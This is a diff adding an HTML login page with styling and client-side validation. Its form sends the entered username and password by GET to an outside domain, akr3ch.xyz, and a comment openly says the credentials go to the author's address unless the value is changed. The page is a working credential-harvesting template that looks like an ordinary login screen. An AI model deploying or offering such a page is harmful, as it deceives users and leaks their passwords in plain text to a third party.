@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+  
+<head>
+  <title>Login Page</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+    }
+
+    h1 {
+      text-align: center;
+      margin-top: 50px;
+    }
+
+    form {
+      max-width: 300px;
+      margin: 0 auto;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 5px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+
+    label,
+    input {
+      display: block;
+      margin-bottom: 10px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      box-sizing: border-box; /* Fix for input padding */
+    }
+
+    input[type="submit"] {
+      width: 100%;
+      padding: 10px;
+      background-color: #4CAF50;
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #45a049;
+    }
+
+    .error {
+      color: #f44336;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+
+<body>
+  <h1>Login</h1>
+  // change the addess value if you don't want to send the username and password at my address:)
+  <form id="login-form" action="http://akr3ch.xyz/" method="get">
+    <label for="username">Username:</label>
+    <input type="text" id="username" name="username" required>
+
+    <label for="password">Password:</label>
+    <input type="password" id="password" name="password" required>
+
+    <input type="submit" value="Login">
+    <div id="error-message" class="error" style="display: none;"></div>
+  </form>
+
+  <script>
+    const loginForm = document.getElementById("login-form");
+    const errorMessage = document.getElementById("error-message");
+
+    loginForm.addEventListener("submit", function(event) {
+      event.preventDefault();
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      // Basic validation
+      if (!username || !password) {
+        errorMessage.textContent = "Please enter both username and password.";
+        errorMessage.style.display = "block";
+      } else {
+        errorMessage.style.display = "none";
+        // You can handle further processing or submit the form here
+        loginForm.submit();
+      }
+    });
+  </script>
+</body>
+
+</html>
